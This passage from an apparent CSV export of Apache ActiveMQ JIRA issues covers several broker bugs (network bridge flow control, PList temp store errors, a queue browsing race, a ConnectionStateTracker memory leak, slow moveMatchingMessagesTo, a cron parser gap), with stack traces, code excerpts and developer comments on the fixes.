The apparent preservation of {{responseRequired}} is a result of {{remoteBroker.oneway(message);}} versus {{remoteBroker.asyncRequest(message, callback);}}

Solution
========
It seems odd that there should be any concern for the message's original {{responseRequired}} flag.  Once the message is dispatched to the bridge for forwarding, the original producer ceases to care and not waiting for a response.  Once a response is returned from the remote broker, it is only used to signal the message ACK so that the local broker so that the inflight and dequeue counts can be updated --- neither the response nor the ACK continues on to the original producer.

Because the blocking of the network bridge by producer flow control on one queue can have a serious side effect (blocking the bridge completely), I think the best solution is to remove the logic from DemandForwardingBridgeSupport that takes into account {{message.isResponseRequired}} and simply always forwards the message with {{remoteBroker.asyncRequest(message, callback);}}

Alternatively (and unnecessarily if the {{remoteBroker.oneway(message);}} is removed), I've attached a patch that adds a {{remoteDispatchType}} field to org.apache.activemq.network.NetworkBridgeConfiguration.

{{remoteDispatchType}} can have one of three values:
# {{AUTO}} - DemandForwardingBridgeSupport works as described above and uses {{remoteBroker.oneway(message);}} or {{remoteBroker.asyncRequest(message, callback);}} depending on {{message.isResponseRequired}}
# {{ALWAYS_SYNC}} - DemandForwardingBridgeSupport uses {{remoteBroker.asyncRequest(message, callback);}} to forward all messages (i.e., it behaves the same as the first suggested solution)
# {{ALWAYS_ASYNC}} - DemandForwardingBridgeSupport uses {{remoteBroker.oneway(message);}} to forward all messages

A unit test is also included which demonstrates the good/bad behaviour for all combinations of persistent/non-persistent and {{remoteDispatchType}}.  Pay particular note to the final assertions in the unit test -- the test is designed to pass as-is by modifying the expectations to validate the bad behaviour when necessary.  Ideally, the bad behaviour should cause test case failure if you feel that blocking the entire network bridge is a bug.",,gtully,sully6768,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3875,,,,,,,,,,,,,"19/May/11 19:12;stirlingc;AMQ-3331.patch;https://issues.apache.org/jira/secure/attachment/12479816/AMQ-3331.patch","19/May/11 18:52;stirlingc;NetworkBridgeProducerFlowControlPrePatchTest.java;https://issues.apache.org/jira/secure/attachment/12479812/NetworkBridgeProducerFlowControlPrePatchTest.java","19/May/11 19:13;stirlingc;NetworkBridgeProducerFlowControlTest.java;https://issues.apache.org/jira/secure/attachment/12479817/NetworkBridgeProducerFlowControlTest.java",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,44367,,,Fri Feb 01 17:23:40 UTC 2013,,,,,,,Patch Available,,,,"0|i0aguv:",59004,,,,,,,,,,,,,,,,,,,,,"19/May/11 18:52;stirlingc;Unit test that works with AMQ 5.5.0 to demonstrate how the network bridge is blocked.  The unit test passes when persistent messages are sent and fails with non-persistent messages.;;;","19/May/11 19:12;stirlingc;Patch that adds remoteDispatchType to NetworkBridgeConfiguration.;;;","19/May/11 19:13;stirlingc;Unit test that verifies the patch.  ;;;","20/Oct/11 14:18;gtully;Variant of patch applied with thanks in: http://svn.apache.org/viewvc?rev=1186813&view=rev

Added boolean attribute, {{alwaysSyncSend}} to the network connector. This allows the behavior for persistent messages to be applied to non-persistent messages.
It does not make sense to have an 'always Async' mode as this could lead to lost persistent messages. As a result then need for the enum goes away.

Also, I agree with the assessment of the use of the responseRequired flag in the choice of sync/async send, 
it should be based on the persistence attribute of the message, I have fixed that.
This is vital such that messages sent in transactions are not sent async.

Thanks for the great test case, made life much easier.;;;","01/Feb/13 17:13;gtully;we should default alwaysSyncSend to true. otherwise we can run into connection blocking on resource limits when forwarding non persistent messages.
and we can have message loss. Best to be reliably forward all messages types by default.;;;","01/Feb/13 17:23;gtully;alwaysSyncSend=true the default in http://svn.apache.org/viewvc?rev=1441545&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"PList temp store,  chunk stream does not exist when broker under stress",AMQ-3325,12507461,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,17/May/11 08:58,20/Sep/11 10:42,14/Jul/23 05:43,17/May/11 09:22,5.5.0,,,,,5.6.0,,,Message Store,,,,0,FilePendingMessageCursor,Temp,,,,,,,"apparent concurrency issue, multicore (8 cpu) under load, sporadic occurrence, related to memory limits and dynamic destination creation/deletion. Broker stack trace:
{code}2011-04-07 08:04:07,295 [Queue:loadq-4  ] ERROR FilePendingMessageCursor       - I/O error
java.io.EOFException: Chunk stream does not exist at page: 198
	at org.apache.kahadb.page.Transaction$2.readPage(Transaction.java:454)
	at org.apache.kahadb.page.Transaction$2.<init>(Transaction.java:431)
	at org.apache.kahadb.page.Transaction.openInputStream(Transaction.java:428)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:404)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:361)
	at org.apache.activemq.store.kahadb.plist.PList.loadEntry(PList.java:468)
	at org.apache.activemq.store.kahadb.plist.PList.getNext(PList.java:483)
	at org.apache.activemq.store.kahadb.plist.PList$10.execute(PList.java:312)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
	at org.apache.activemq.store.kahadb.plist.PList.getNext(PList.java:310)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.next(FilePendingMessageCursor.java:500)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.next(FilePendingMessageCursor.java:473)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.next(FilePendingMessageCursor.java:293)
	at org.apache.activemq.broker.region.Queue.doPageInForDispatch(Queue.java:1714)
	at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1932)
	at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1440)
	at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:104)
	at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:42){code}","concurrency issue, multicore under load, sporadic occurrence, related to memory limits and dynamic destination creation/deletion",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14569,,,Tue May 17 09:22:31 UTC 2011,,,,,,,,,,,"0|i0ajdz:",59414,,,,,,,,,,,,,,,,,,,,,"17/May/11 09:22;gtully;add/remove of a plist needs to be synced with additions to the store as they share pages.

http://svn.apache.org/viewvc?rev=1104075&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
A possible browsing concurrency issue in org.apache.activemq.broker.region.Queue,AMQ-3319,12507047,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,pbruski_,pbruski_,12/May/11 21:58,20/Sep/11 10:42,14/Jul/23 05:43,02/Jul/11 16:39,5.4.2,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"Some time ago clients of our ActiveMQ instance locked up while browsing. Analysis of the log files showed a large amount of:
{code}
 java.util.NoSuchElementException
	at java.util.LinkedList.remove(LinkedList.java:788)
	at java.util.LinkedList.removeFirst(LinkedList.java:134)
	at org.apache.activemq.broker.region.Queue.getNextBrowserDispatch(Queue.java:1341)
	at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1463)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:637)
{code}
Happening before lockup.

It seems there is a problem in Queue class, which uses non thread safe LinkedList collection. Additions and removals to/from this collection are wrapped by a shared readLock, which means there is no guard against concurrent modification and there is also a possibility of a race condition between isEmpty and removeFirst call during concurrent usages of getNextBrowserDispatch (if they are possible).

I think the easiest fix is to switch from LinkedList to ConcurrentLinkedQueue and make use of Queue methods to access the collection (because they allow single step isEmpty/remove call). I am attaching a patch that does it. I've left the readLocks in case they are used to block writes someplace else, but they are not needed anymore for concurrency control over the new collection.
","OS X, Linux",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/May/11 21:59;pbruski_;patch.diff;https://issues.apache.org/jira/secure/attachment/12479014/patch.diff",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14601,,,Sat Jul 02 16:39:10 UTC 2011,,,,,,,Patch Available,,,,"0|i0agvb:",59006,,,,,,,,,,,,,,,,,,,,,"12/May/11 22:07;pbruski_;I've encountered the problem on OS X and AMQ 5.4.2, but it looks like the issue is still present in trunk.;;;","02/Jul/11 16:39;tabish;Verified that the queue is not protected and the read lock around that code is not needed once the code is switched to a ConcurrentLinkQueue.

Nice catch, thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Memory leak in ConnectionStateTracker with MessagePull objects,AMQ-3316,12506889,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,mcarpella,mcarpella,11/May/11 18:14,16/Jan/14 22:54,14/Jul/23 05:43,11/May/11 18:53,5.4.2,5.5.0,,,,5.6.0,,,,,,,0,,,,,,,,,"We discovered a memory leak in {{ConnectionStateTracker}} in case a long-lived connection with prefetch=0 is used.

If prefetch=0 is used, {{MessagePull}} objects are enqueued in {{messageCache}} with an estimated size of 400. But in the cache's {{removeEldestEntry()}} method no size is subtracted from {{currentCacheSize}} for {{MessagePull}} instances. This messes with the cache as it will continue to remove objects even if there is space in the cache. But after about 5,368,709 consumed messages this will cause the {{currentCacheSize}} to roll-over maximum integer and become negative. As a consequence, for the next about 5,368,709 no messages will be removed from the cache any longer.

This sooner or later will trigger out-of-memory conditions, depending on the size of the various pools. In our case this caused out-of-memory in PermGen first, as message IDs seem to be internalized, and PermGen is considerably smaller than the heap.",,gdanov,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4977,,,,,,,,,,,,,,,,"11/May/11 19:08;mcarpella;connectionstatetracker_fixed.patch;https://issues.apache.org/jira/secure/attachment/12478863/connectionstatetracker_fixed.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14644,,,Thu Jan 16 22:54:23 UTC 2014,,,,,,,Patch Available,,,,"0|i0ajev:",59418,,,,,,,,,,,,,,,,,,,,,"11/May/11 18:15;mcarpella;Patch with proposed fix for the issue. Applies to both 5.4.2 and 5.5.0.;;;","11/May/11 18:53;gtully;patch applied with thanks in http://svn.apache.org/viewvc?rev=1102018&view=rev

great catch :-);;;","11/May/11 18:59;mcarpella;Sorry, I noticed a typo in the patch. Of course it should be ""instanceof"" instead of ""instance of"" :/ My bad, please fix this as well.;;;","11/May/11 19:08;mcarpella;Attached new patch with fixed typo.;;;","16/Jan/14 22:13;gdanov;I think I found case that is not handled by the fix. We see memory leaks connected to this bug and after good amount of headbanging I think the problem is in how two methods work together - processMessagePull and trackBack. The first one has this piece of code:
{code}
  // leave a single instance in the cache
            final String id = pull.getDestination() + ""::"" + pull.getConsumerId();
            messageCache.put(id.intern(), pull);
{code}
while the second one unconditionally increases the currentCacheSize - regardless if the previous method added or *replaced* entry in the cache.

The situation where entries will be replaced (and not added) and the currentCacheSize will grow very fast until it wraps around and becomes negative is the following:
* have some logic that frequently creates queue browser and iterates through all the entries
* have the queue most of the time with at least one message. The more messages in the queue the faster currentCacheSize grows.

Here is log from reproducing the issue as a proof:
{code}
2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 10000, 5 elements, pending scans:10, memory: 8951KB
2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 20000, 10 elements, pending scans:10, memory: 10845KB
2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 30000, 15 elements, pending scans:10, memory: 12645KB
2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 40000, 20 elements, pending scans:10, memory: 10363KB
2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 50000, 25 elements, pending scans:10, memory: 12169KB
2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 60000, 30 elements, pending scans:10, memory: 9852KB
2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 70000, 35 elements, pending scans:10, memory: 11657KB
2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 80000, 40 elements, pending scans:10, memory: 9401KB
2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 90000, 45 elements, pending scans:10, memory: 11222KB
2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 100000, 50 elements, pending scans:10, memory: 13047KB
2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 110000, 55 elements, pending scans:10, memory: 10767KB
2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 120000, 60 elements, pending scans:10, memory: 12567KB
2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 130000, 65 elements, pending scans:10, memory: 10256KB
2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 138800, 67 elements, pending scans:10, memory: 12085KB
2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 146800, 67 elements, pending scans:10, memory: 9745KB
2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 154800, 67 elements, pending scans:10, memory: 11566KB
2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 162800, 67 elements, pending scans:10, memory: 9225KB
2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 170800, 67 elements, pending scans:10, memory: 11013KB
2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 178800, 67 elements, pending scans:10, memory: 12812KB
2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 186800, 67 elements, pending scans:10, memory: 10522KB
2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 194800, 67 elements, pending scans:10, memory: 12328KB
2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 202800, 67 elements, pending scans:10, memory: 9999KB
2014-01-16 23:05:15  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 210800, 67 elements, pending scans:10, memory: 11805KB
2014-01-16 23:05:15  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 218800, 67 elements, pending scans:10, memory: 9496KB
2014-01-16 23:05:15  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 226800, 67 elements, pending scans:10, memory: 11316KB
2014-01-16 23:05:15  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 234800, 67 elements, pending scans:10, memory: 13100KB
2014-01-16 23:05:15  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 242800, 67 elements, pending scans:10, memory: 10754KB
{code}
One can see that the garbage collection works well (cache does not grow) but the currentCacheSize keeps increasing

Unfortunately I cannot easily extract the original code and provide it. Hope the explanation is clear enough. If you agree - this bug has to be re-opened ;;;","16/Jan/14 22:54;gdanov;created AMQ-4977;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"FilePendingMessageCursor isFull reports full in error when temp store is full, even if not needing the temp store",AMQ-3314,12506741,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,10/May/11 17:11,09/Apr/15 21:34,14/Jul/23 05:43,10/May/11 17:17,5.5.0,,,,,5.6.0,,,Broker,,,,0,block,cursor,memory,temp,topic,usage,,,"With slow queue consumers of non persistent messages the temp store can be filled and producers blocked. The default cursor for non persistent is a fileCursor. 
However topic subs with a pending message limit strategy also use a cursor for pending messages. If there is sufficient memory resources, the topic consumers should be able to operate without recourse to the temp store. At the moment this is not the case, as the check to isFull reports true in error (based on the status of the temp store)
It should only report full if its memory is exhausted || it is spooling to disk AND the temp store is exhausted.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-5716,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14640,,,Tue May 10 17:17:25 UTC 2011,,,,,,,,,,,"0|i0agvj:",59007,,,,,,,,,,,,,,,,,,,,,"10/May/11 17:17;gtully;fix in http://svn.apache.org/viewvc?rev=1101544&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Queue's moveMatchingMessagesTo method is extremely slow to the point of being unusable as Queue size increases,AMQ-3312,12506666,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,stirlingc,stirlingc,09/May/11 23:50,20/Sep/11 10:42,14/Jul/23 05:43,20/May/11 15:17,5.5.0,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"Symptom
=======
We have a system based on ActiveMQ that stores messages in a non-peristent queue.  Frequently, we have to move a specific message from this queue to another queue.  The message to be moved may be anywhere in the queue, and is identified by a selector on a custom JMS integer property.

To facilitate the selection and move, we use org.apache.activemq.broker.region.Queue#moveMatchingMessagesTo(ConnectionContext context, String selector, ActiveMQDestination dest)

We've found that once our queue grows past 10K messages, moving a single message takes over 10s.  When the queue grows past 20K messages, a move takes 70s.  It's clear from testing that the time to move a message grows exponentially as the queue size increases, to the point that moveMatchingMessagesTo becomes unusable.

Cause
=====
AMQ 5.5.0 has this implementation for moveMatchingMessagesTo:

{code:title=Queue#moveMatchingMessagesTo(ConnectionContext context, MessageReferenceFilter filter}
    public int moveMatchingMessagesTo(ConnectionContext context, MessageReferenceFilter filter,
            ActiveMQDestination dest, int maximumMessages) throws Exception {
        int movedCounter = 0;
        Set<QueueMessageReference> set = new CopyOnWriteArraySet<QueueMessageReference>();
        do {
            doPageIn(true);
            pagedInMessagesLock.readLock().lock();
            try{
                set.addAll(pagedInMessages.values());
            }finally {
                pagedInMessagesLock.readLock().unlock();
            }
            List<QueueMessageReference> list = new ArrayList<QueueMessageReference>(set);
            for (QueueMessageReference ref : list) {
                if (filter.evaluate(context, ref)) {
                    // We should only move messages that can be locked.
                    moveMessageTo(context, ref, dest);
                    set.remove(ref);
                    if (++movedCounter >= maximumMessages && maximumMessages > 0) {
                        return movedCounter;
                    }
                }
            }
        } while (set.size() < this.destinationStatistics.getMessages().getCount() && set.size() < maximumMessages);
        return movedCounter;
    }
{code}

In the context that we use, maximumMessages is Integer.MAXINT:

{code:title=moveMatchingMessagesTo(ConnectionContext context, String selector, ActiveMQDestination dest)}
    public int moveMatchingMessagesTo(ConnectionContext context, String selector, ActiveMQDestination dest)
            throws Exception {
        return moveMatchingMessagesTo(context, selector, dest, Integer.MAX_VALUE);
    }
{code}

Since moveMatchingMessagesTo instantiates the set variable as a CopyOnWriteArraySet, each doPageIn loop creates a new array, copies the existing set members, and then linearly scans the array for the insertion.  The result is that moveMatchingMessagesTo is an O(n^2) algorithm with respect to message copying, where n is the size of the queue.

Solution
========
set is scoped to a single call of moveMatchingMessagesTo, and is only accessed by a single thread, so there is no benefit to using CopyOnWriteArraySet.  Simply changing set to a HashSet prevents the need for the doPageIn loop to copy the set on each iteration, and insertion becomes an O(1) operation.

Attached is a unit test that demonstrates how moving the last message from a queue of 10K messages takes 8s (on our machine).  Included is a patch Queue that changes set from a CopyOnWriteArraySet to a HashSet; with this patch, the same unit test completes in under 200ms.
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/May/11 23:54;stirlingc;AMQ3312.patch;https://issues.apache.org/jira/secure/attachment/12478654/AMQ3312.patch","09/May/11 23:52;stirlingc;LargeQueueSparseDeleteTest.java;https://issues.apache.org/jira/secure/attachment/12478653/LargeQueueSparseDeleteTest.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14572,,,Fri May 20 15:17:13 UTC 2011,,,,,,,Patch Available,,,,"0|i0ajfb:",59420,,,,,,,,,,,,,,,,,,,,,"09/May/11 23:52;stirlingc;Unit test that can be run against the unpatched AMQ trunk to demonstrate how long moving a message from a queue can take.  The same unit test can be used to verify that the patch improves performance of this operation by a considerable amount.;;;","09/May/11 23:54;stirlingc;Patch that changes Queue#moveMatchingMessagesTo to use HashSet rather than CopyOnWriteArraySet;;;","20/May/11 14:11;tabish;This appears to also affect the methods, copyMatchingMessages and removeMatchingMessages.  In each case the Thread locality of the set object in use is limited to one thread so I don't see why a CopyOnWriteArraySet is needed for any of these methods.

;;;","20/May/11 15:17;tabish;Fixed, patch applied along with fixing the other two methods that had this same issue.  Test updated to cover all three.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
maven-activemq-perf-plugin documentation wrong : sysTest.reportDirectory should be sysTest.reportDir,AMQ-3311,12506650,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,scranton,scranton,09/May/11 19:12,20/May/11 13:19,14/Jul/23 05:43,20/May/11 13:19,,,,,,,,,Documentation,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74700,,,Fri May 20 13:19:32 UTC 2011,,,,,,,,,,,"0|i182xz:",255279,,,,,,,,,,,,,,,,,,,,,"20/May/11 13:19;tabish;Website docs updated.  Thanks;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"IOException PListStore ""Could not locate data file"" from FilePendingMessageCursor",AMQ-3310,12506622,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,09/May/11 15:16,20/Sep/11 10:42,14/Jul/23 05:43,09/May/11 16:12,5.5.0,,,,,5.6.0,,,Message Store,,,,0,cursors,PListStore,temp,,,,,,"Corruption of the temp store used by file pending message cursors due to removal of data files in error. Contention over reference counts and async writes. Reproducible under heavy load with many concurrent consumers.
{code}java.lang.RuntimeException: java.io.IOException: Could not locate data file ./tmp_storage/db-332.log
        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.<init>(FilePendingMessageCursor.java:486)
        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.reset(FilePendingMessageCursor.java:129)
        at org.apache.activemq.broker.region.Queue.doPageInForDispatch(Queue.java:1712)
        at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1932)
        at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1440)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:104)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:42)
Caused by: java.io.IOException: Could not locate data file ./tmp_storage/db-332.log
        at org.apache.kahadb.journal.Journal.getDataFile(Journal.java:350)
        at org.apache.kahadb.journal.Journal.read(Journal.java:597)
        at org.apache.activemq.store.kahadb.plist.PListStore.getPayload(PListStore.java:337)
        at org.apache.activemq.store.kahadb.plist.PList.getFirst(PList.java:280)
        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.<init>(FilePendingMessageCursor.java:482){code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14642,,,Mon May 09 16:12:42 UTC 2011,,,,,,,,,,,"0|i0ajfj:",59421,,,,,,,,,,,,,,,,,,,,,"09/May/11 16:12;gtully;fix in http://svn.apache.org/viewvc?rev=1101085&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cron parser doesn't understand '?',AMQ-3306,12506468,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tomdz,tomdz,06/May/11 22:53,20/Sep/11 10:42,14/Jul/23 05:43,10/May/11 19:30,,,,,,5.6.0,,,,,,,0,,,,,,,,,See e.g. http://en.wikipedia.org/wiki/Cron#Special_Characters for what '?' is used for.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14643,,,Tue May 10 19:30:26 UTC 2011,,,,,,,,,,,"0|i0ajfr:",59422,,,,,,,,,,,,,,,,,,,,,"10/May/11 19:30;tabish;fixed in trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
